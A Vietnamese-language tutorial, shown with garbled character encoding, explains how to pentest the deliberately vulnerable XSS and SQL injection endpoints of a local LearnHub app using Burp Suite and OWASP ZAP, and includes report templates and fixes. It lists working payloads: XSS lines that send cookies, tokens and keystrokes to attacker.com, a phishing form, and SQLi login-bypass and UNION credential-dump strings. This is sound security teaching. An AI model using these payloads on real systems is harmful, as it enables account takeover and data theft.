# üîê H∆∞·ªõng d·∫´n Pentest LearnHub v·ªõi Burp Suite / OWASP ZAP

## M·ª•c l·ª•c
1. [Gi·ªõi thi·ªáu](#gi·ªõi-thi·ªáu)
2. [C√†i ƒë·∫∑t c√¥ng c·ª•](#c√†i-ƒë·∫∑t-c√¥ng-c·ª•)
3. [C·∫•u h√¨nh m√¥i tr∆∞·ªùng](#c·∫•u-h√¨nh-m√¥i-tr∆∞·ªùng)
4. [Demo XSS (Cross-Site Scripting)](#demo-xss)
5. [Demo SQL Injection](#demo-sql-injection)
6. [B√°o c√°o l·ªó h·ªïng](#b√°o-c√°o-l·ªó-h·ªïng)

---

## Gi·ªõi thi·ªáu

Project LearnHub ƒë√£ ƒë∆∞·ª£c t√≠ch h·ª£p s·∫µn c√°c **l·ªó h·ªïng b·∫£o m·∫≠t c·ªë √Ω** ƒë·ªÉ demo pentest:
- **XSS Reflected**: Ph·∫£n h·ªìi input kh√¥ng sanitize
- **XSS Stored**: L∆∞u tr·ªØ payload ƒë·ªôc h·∫°i
- **SQL Injection**: Khai th√°c raw query

### Endpoints Demo:
| Endpoint | Ph∆∞∆°ng th·ª©c | L·ªó h·ªïng |
|----------|-------------|---------|
| `/api/v1/pentest/xss/reflected` | GET | XSS Reflected |
| `/api/v1/pentest/xss/stored` | POST | XSS Stored |
| `/api/v1/pentest/xss/list` | GET | XSS Stored (hi·ªÉn th·ªã) |
| `/api/v1/pentest/sqli/search` | GET | SQL Injection |
| `/api/v1/pentest/sqli/login` | POST | SQL Injection Login Bypass |
| `/api/v1/pentest/sqli/user` | GET | SQL Injection UNION SELECT |

---

## C√†i ƒë·∫∑t c√¥ng c·ª•

### Option 1: Burp Suite Community Edition (Khuy√™n d√πng)

1. **T·∫£i v·ªÅ**: https://portswigger.net/burp/communitydownload
2. **C√†i ƒë·∫∑t**: Ch·∫°y installer, l√†m theo h∆∞·ªõng d·∫´n
3. **Y√™u c·∫ßu**: Java JRE/JDK 8+

### Option 2: OWASP ZAP (Mi·ªÖn ph√≠ ho√†n to√†n)

1. **T·∫£i v·ªÅ**: https://www.zaproxy.org/download/
2. **C√†i ƒë·∫∑t**: Ch·∫°y installer
3. **Y√™u c·∫ßu**: Java JRE 11+

---

## C·∫•u h√¨nh m√¥i tr∆∞·ªùng

### B∆∞·ªõc 1: Kh·ªüi ƒë·ªông LearnHub

```bash
# Terminal 1: Backend
cd learnhub-backend
npm install
npm run dev
# Server ch·∫°y t·∫°i http://localhost:8080

# Terminal 2: Frontend
cd learnhub-frontend
npm install
npm run dev
# App ch·∫°y t·∫°i http://localhost:5173
```

### B∆∞·ªõc 2: C·∫•u h√¨nh Burp Suite

1. **M·ªü Burp Suite** ‚Üí ch·ªçn **Temporary Project** ‚Üí **Start Burp**

2. **C·∫•u h√¨nh Proxy Listener:**
   - V√†o `Proxy` ‚Üí `Options` ‚Üí `Proxy Listeners`
   - ƒê·∫£m b·∫£o c√≥ listener: `127.0.0.1:8080` (ho·∫∑c thay ƒë·ªïi n·∫øu b·ªã conflict)
   - N·∫øu conflict v·ªõi backend, ƒë·ªïi th√†nh `127.0.0.1:8081`

3. **C·∫•u h√¨nh Intercept:**
   - V√†o `Proxy` ‚Üí `Intercept`
   - ƒê·∫£m b·∫£o `Intercept is on`

### B∆∞·ªõc 3: C·∫•u h√¨nh Browser

#### Chrome/Edge:
1. C√†i extension **FoxyProxy Standard**
2. Th√™m proxy m·ªõi:
   - Proxy Type: HTTP
   - IP: 127.0.0.1
   - Port: 8081 (ho·∫∑c port Burp)
3. Enable proxy khi pentest

#### Ho·∫∑c c·∫•u h√¨nh th·ªß c√¥ng:
1. Settings ‚Üí System ‚Üí Open proxy settings
2. Manual proxy setup ‚Üí ON
3. Address: 127.0.0.1, Port: 8081

### B∆∞·ªõc 4: C√†i ƒë·∫∑t CA Certificate (HTTPS)

**Burp Suite:**
1. Truy c·∫≠p `http://burpsuite` khi proxy ƒëang b·∫≠t
2. T·∫£i CA Certificate
3. C√†i ƒë·∫∑t v√†o browser:
   - Chrome: Settings ‚Üí Privacy and Security ‚Üí Security ‚Üí Manage certificates

**OWASP ZAP:**
1. Tools ‚Üí Options ‚Üí Dynamic SSL Certificates
2. Generate & Save
3. Import v√†o browser

---

## Demo XSS

### üéØ XSS Reflected

**M·ª•c ti√™u:** Ch·ª©ng minh input kh√¥ng ƒë∆∞·ª£c sanitize v√† ph·∫£n h·ªìi tr·ª±c ti·∫øp.

#### B∆∞·ªõc 1: Truy c·∫≠p trang demo
```
http://localhost:5173/pentest
```

#### B∆∞·ªõc 2: Trong Burp Suite, b·∫Øt request XSS Reflected

1. Nh·∫≠p payload v√†o √¥ search: `<script>alert('XSS')</script>`
2. Nh·∫•n **Test XSS Reflected**
3. Trong Burp ‚Üí `Proxy` ‚Üí `HTTP history`, t√¨m request:

```http
GET /api/v1/pentest/xss/reflected?search=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1
Host: localhost:8080
```

#### B∆∞·ªõc 3: Ph√¢n t√≠ch Response

```json
{
  "message": "K·∫øt qu·∫£ t√¨m ki·∫øm",
  "search": "<script>alert('XSS')</script>",
  "results": []
}
```

**‚ö†Ô∏è L·ªó h·ªïng:** Input ƒë∆∞·ª£c tr·∫£ v·ªÅ nguy√™n b·∫£n, kh√¥ng ƒë∆∞·ª£c escape.

#### B∆∞·ªõc 4: Th·ª≠ c√°c payload kh√°c

```html
<!-- Payload 1: Event Handler -->
<img src=x onerror=alert('XSS')>

<!-- Payload 2: SVG -->
<svg onload=alert('XSS')>

<!-- Payload 3: Cookie Stealing -->
<script>document.location='http://attacker.com?c='+document.cookie</script>

<!-- Payload 4: Bypass filter -->
<ScRiPt>alert('XSS')</ScRiPt>
```

---

### üéØ XSS Stored

**M·ª•c ti√™u:** Ch·ª©ng minh payload XSS ƒë∆∞·ª£c l∆∞u v√† th·ª±c thi khi hi·ªÉn th·ªã.

#### B∆∞·ªõc 1: L∆∞u comment c√≥ XSS payload

1. Chuy·ªÉn tab **XSS Stored**
2. Nh·∫≠p Author: `Attacker`
3. Nh·∫≠p Comment: `<script>alert('Stored XSS')</script>`
4. Nh·∫•n **L∆∞u Comment**

#### B∆∞·ªõc 2: B·∫Øt request trong Burp

```http
POST /api/v1/pentest/xss/stored HTTP/1.1
Host: localhost:8080
Content-Type: application/json

{"comment":"<script>alert('Stored XSS')</script>","author":"Attacker"}
```

#### B∆∞·ªõc 3: Xem danh s√°ch comments

Khi refresh list, script s·∫Ω ƒë∆∞·ª£c th·ª±c thi v√¨ frontend s·ª≠ d·ª•ng `dangerouslySetInnerHTML`.

#### B∆∞·ªõc 4: Payload n√¢ng cao

```html
<!-- Keylogger -->
<script>
document.onkeypress = function(e) {
  fetch('http://attacker.com/log?key=' + e.key);
}
</script>

<!-- Session Hijacking -->
<script>
fetch('http://attacker.com/steal?session=' + localStorage.getItem('token'));
</script>

<!-- Phishing Form -->
<form action="http://attacker.com/phish" method="POST">
  <input name="password" placeholder="Nh·∫≠p m·∫≠t kh·∫©u ƒë·ªÉ ti·∫øp t·ª•c">
  <button>Submit</button>
</form>
```

---

## Demo SQL Injection

### üéØ SQLi Search

**M·ª•c ti√™u:** Khai th√°c l·ªó h·ªïng trong t√¨m ki·∫øm ƒë·ªÉ l·∫•y to√†n b·ªô d·ªØ li·ªáu.

#### B∆∞·ªõc 1: Request b√¨nh th∆∞·ªùng

```http
GET /api/v1/pentest/sqli/search?query=admin HTTP/1.1
```

SQL ƒë∆∞·ª£c t·∫°o:
```sql
SELECT id, username, email, role FROM users WHERE username LIKE '%admin%' OR email LIKE '%admin%'
```

#### B∆∞·ªõc 2: Inject payload

Th·ª≠ payload: `admin' OR '1'='1`

```http
GET /api/v1/pentest/sqli/search?query=admin'%20OR%20'1'%3D'1 HTTP/1.1
```

SQL b·ªã bi·∫øn ƒë·ªïi:
```sql
SELECT id, username, email, role FROM users WHERE username LIKE '%admin' OR '1'='1%' OR email LIKE '%admin' OR '1'='1%'
```

**K·∫øt qu·∫£:** Tr·∫£ v·ªÅ t·∫•t c·∫£ users trong database!

#### B∆∞·ªõc 3: C√°c payload SQLi kh√°c

```sql
-- L·∫•y t·∫•t c·∫£ users
' OR '1'='1
' OR ''='

-- Comment ph·∫ßn sau
admin'--
admin'#

-- UNION SELECT (ph·ª• thu·ªôc s·ªë c·ªôt)
' UNION SELECT null, null, null, null--
' UNION SELECT id, username, password, role FROM users--

-- Time-based blind SQLi
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--

-- Error-based SQLi
' AND 1=CONVERT(int, @@version)--
```

---

### üéØ SQLi Login Bypass

**M·ª•c ti√™u:** Bypass authentication m√† kh√¥ng c·∫ßn bi·∫øt m·∫≠t kh·∫©u.

#### B∆∞·ªõc 1: Request login b√¨nh th∆∞·ªùng

```http
POST /api/v1/pentest/sqli/login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"wrongpassword"}
```

SQL:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'wrongpassword'
```

**K·∫øt qu·∫£:** Login th·∫•t b·∫°i

#### B∆∞·ªõc 2: Inject payload v√†o username

```http
POST /api/v1/pentest/sqli/login HTTP/1.1
Content-Type: application/json

{"username":"admin' OR '1'='1--","password":"anything"}
```

SQL b·ªã bi·∫øn ƒë·ªïi:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1--' AND password = 'anything'
```

**K·∫øt qu·∫£:** Login th√†nh c√¥ng v·ªõi account ƒë·∫ßu ti√™n trong database!

#### B∆∞·ªõc 3: Bypass variations

```sql
-- Comment password check
admin'--
admin'#
admin'/*

-- Always true conditions
' OR '1'='1
' OR 1=1--
' OR 'x'='x

-- Specific user
admin' AND '1'='1
' OR username='admin'--
```

---

### üéØ SQLi UNION SELECT

**M·ª•c ti√™u:** L·∫•y d·ªØ li·ªáu t·ª´ c√°c b·∫£ng kh√°c.

#### B∆∞·ªõc 1: T√¨m s·ªë c·ªôt

```sql
-- TƒÉng d·∫ßn cho ƒë·∫øn khi kh√¥ng l·ªói
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
1' ORDER BY 4-- (L·ªói ‚Üí c√≥ 3 c·ªôt)
```

#### B∆∞·ªõc 2: UNION SELECT

```sql
-- V·ªõi 3 c·ªôt
1' UNION SELECT null, null, null--
1' UNION SELECT 'a', 'b', 'c'--
1' UNION SELECT username, password, role FROM users--
```

#### B∆∞·ªõc 3: L·∫•y th√¥ng tin database

```sql
-- PostgreSQL
1' UNION SELECT null, version(), null--
1' UNION SELECT table_name, column_name, null FROM information_schema.columns--

-- MySQL
1' UNION SELECT null, @@version, null--
1' UNION SELECT table_name, column_name, null FROM information_schema.columns WHERE table_schema=database()--
```

---

## S·ª≠ d·ª•ng Burp Suite Scanner (T·ª± ƒë·ªông)

### Active Scan

1. Trong `HTTP history`, click ph·∫£i v√†o request
2. Ch·ªçn **Do active scan**
3. Burp s·∫Ω t·ª± ƒë·ªông th·ª≠ c√°c payload XSS v√† SQLi
4. Xem k·∫øt qu·∫£ trong `Target` ‚Üí `Issues`

### Intruder (Brute Force)

1. Click ph·∫£i v√†o request ‚Üí **Send to Intruder**
2. Trong tab `Positions`, ƒë√°nh d·∫•u parameter c·∫ßn test:
   ```
   GET /api/v1/pentest/sqli/search?query=¬ßadmin¬ß HTTP/1.1
   ```
3. Tab `Payloads`: Load wordlist (VD: SecLists SQLi)
4. **Start attack**

---

## S·ª≠ d·ª•ng OWASP ZAP

### C·∫•u h√¨nh c∆° b·∫£n

1. **Tools** ‚Üí **Options** ‚Üí **Local Proxy**: Port 8081
2. **Tools** ‚Üí **Options** ‚Üí **HUD**: Enable/Disable theo √Ω mu·ªën

### Automated Scan

1. **Quick Start** ‚Üí nh·∫≠p URL: `http://localhost:5173`
2. **Attack** ‚Üí ZAP s·∫Ω crawl v√† scan t·ª± ƒë·ªông

### Manual Testing

1. M·ªü browser qua ZAP (c√≥ HUD)
2. Truy c·∫≠p c√°c endpoint pentest
3. Xem **Alerts** panel ƒë·ªÉ th·∫•y c√°c l·ªó h·ªïng ph√°t hi·ªán ƒë∆∞·ª£c

### Active Scan c·ª• th·ªÉ

1. Trong **Sites** tree, click ph·∫£i v√†o URL c·∫ßn test
2. **Attack** ‚Üí **Active Scan**
3. Ch·ªçn policy ph√π h·ª£p

---

## B√°o c√°o l·ªó h·ªïng

### M·∫´u b√°o c√°o XSS

```markdown
## XSS Reflected trong ch·ª©c nƒÉng t√¨m ki·∫øm

**M·ª©c ƒë·ªô nghi√™m tr·ªçng:** Trung b√¨nh (Medium)

**URL b·ªã ·∫£nh h∆∞·ªüng:** 
GET /api/v1/pentest/xss/reflected?search=<payload>

**M√¥ t·∫£:**
Endpoint t√¨m ki·∫øm kh√¥ng sanitize input t·ª´ parameter "search" tr∆∞·ªõc khi tr·∫£ v·ªÅ trong response. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n JavaScript ƒë·ªôc h·∫°i.

**B∆∞·ªõc t√°i hi·ªán:**
1. Truy c·∫≠p URL: http://localhost:8080/api/v1/pentest/xss/reflected?search=<script>alert(1)</script>
2. Quan s√°t response ch·ª©a payload kh√¥ng ƒë∆∞·ª£c encode

**Payload:**
<script>alert('XSS')</script>

**Impact:**
- ƒê√°nh c·∫Øp session/cookie
- Phishing
- Keylogging
- Defacement

**Khuy·∫øn ngh·ªã:**
1. Sanitize t·∫•t c·∫£ user input
2. S·ª≠ d·ª•ng Content-Security-Policy header
3. Encode output theo context (HTML, JS, URL)
```

### M·∫´u b√°o c√°o SQL Injection

```markdown
## SQL Injection trong ch·ª©c nƒÉng ƒëƒÉng nh·∫≠p

**M·ª©c ƒë·ªô nghi√™m tr·ªçng:** Cao (Critical)

**URL b·ªã ·∫£nh h∆∞·ªüng:**
POST /api/v1/pentest/sqli/login

**M√¥ t·∫£:**
Endpoint ƒëƒÉng nh·∫≠p s·ª≠ d·ª•ng raw SQL query v·ªõi string concatenation, cho ph√©p k·∫ª t·∫•n c√¥ng inject SQL commands.

**B∆∞·ªõc t√°i hi·ªán:**
1. G·ª≠i POST request v·ªõi body:
   {"username": "admin' OR '1'='1--", "password": "anything"}
2. Quan s√°t response tr·∫£ v·ªÅ th√¥ng tin user ƒë·∫ßu ti√™n

**Payload:**
admin' OR '1'='1--

**SQL Query b·ªã bi·∫øn ƒë·ªïi:**
SELECT * FROM users WHERE username = 'admin' OR '1'='1--' AND password = 'anything'

**Impact:**
- Bypass authentication
- Data leakage
- Data modification/deletion
- Remote code execution (trong m·ªôt s·ªë tr∆∞·ªùng h·ª£p)

**Khuy·∫øn ngh·ªã:**
1. S·ª≠ d·ª•ng Prepared Statements / Parameterized Queries
2. Input validation v·ªõi whitelist
3. √Åp d·ª•ng principle of least privilege cho database user
4. S·ª≠ d·ª•ng ORM v·ªõi proper escaping
```

---

## Kh·∫Øc ph·ª•c l·ªó h·ªïng (Tham kh·∫£o)

### Fix XSS

```javascript
// Tr∆∞·ªõc (L·ªó h·ªïng)
res.json({ search: req.query.search });

// Sau (An to√†n)
const escapeHtml = require('escape-html');
res.json({ search: escapeHtml(req.query.search) });
```

### Fix SQL Injection

```javascript
// Tr∆∞·ªõc (L·ªó h·ªïng)
const sql = `SELECT * FROM users WHERE username = '${username}'`;

// Sau (An to√†n - Parameterized Query)
const results = await sequelize.query(
  'SELECT * FROM users WHERE username = :username',
  {
    replacements: { username },
    type: QueryTypes.SELECT
  }
);
```

---

## T√†i li·ªáu tham kh·∫£o

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)

---

‚ö†Ô∏è **C·∫¢NH B√ÅO:** Ch·ªâ s·ª≠ d·ª•ng ki·∫øn th·ª©c n√†y cho m·ª•c ƒë√≠ch h·ªçc t·∫≠p v√† tr√™n m√¥i tr∆∞·ªùng ƒë∆∞·ª£c ph√©p. Vi·ªác pentest kh√¥ng ƒë∆∞·ª£c ph√©p l√† b·∫•t h·ª£p ph√°p!

